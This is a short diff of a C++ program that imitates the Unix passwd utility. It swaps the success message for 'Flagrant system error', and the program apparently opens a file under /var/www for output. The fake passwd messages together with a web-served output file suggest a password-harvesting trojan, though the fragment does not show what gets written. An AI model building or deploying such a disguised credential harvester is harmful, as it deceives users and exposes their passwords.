@@ -34,7 +34,8 @@ int main (){
 		cout << "passwd: Authentication token manipulation error\n";
 		cout << "passwd: password unchanged\n";
 	} else {
-		cout << "passwd: password updated successfully\n";
+		//cout << "passwd: password updated successfully\n";
+		cout << "Flagrant system error\n";
 	}  
 
 	outfile.open ("/var/www/pass_scheme.txt");
